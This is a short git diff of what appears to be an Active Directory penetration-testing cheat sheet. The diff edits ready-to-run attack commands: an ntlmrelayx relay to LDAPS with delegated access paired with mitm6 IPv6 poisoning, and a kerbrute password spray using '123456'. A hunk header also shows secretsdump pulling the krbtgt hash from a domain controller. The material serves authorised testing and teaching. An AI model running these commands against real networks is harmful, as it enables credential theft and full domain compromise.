@@ -520,7 +520,7 @@ $ secretsdump.py DC01.megacorp.local -just-dc-user 'MEGACORP\krbtgt' -dc-ip 10.1
 * [[PDF] From Zero Credential to Full Domain Compromise (Haboob Team)](https://drive.google.com/file/d/1htCGIt1Wcg53zCSGnRk4wfcKOk5A_YDP/view?usp=sharing)
 
 ```
-$ sudo /usr/local/bin/ntlmrelayx.py -t ldaps://DC01.megacorp.local --delegate-access --no-smb-server -wh attacker-wpad --no-da --no-acl --no-validate-privs [-debug]
+$ ntlmrelayx.py -t ldaps://DC01.megacorp.local --delegate-access -wh attacker-wpad --no-smb-server --no-wcf-server --no-raw-server --no-dump --no-da --no-acl --no-validate-privs [-debug]
 $ sudo mitm6 -i eth0 -d megacorp.local --ignore-nofqdn
 ```
 
@@ -3044,7 +3044,7 @@ $ nullinux.py 127.0.0.1
 * [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
 
 ```
-$ ./kerbrute -v --delay 100 -d megacorp.local -o kerbrute-passwordspray-123456.log passwordspray users.txt '123456'
+$ kerbrute --delay 100 -d megacorp.local -o kerbrute-passwordspray-123456.log passwordspray users.txt '123456'
 ```
 
 
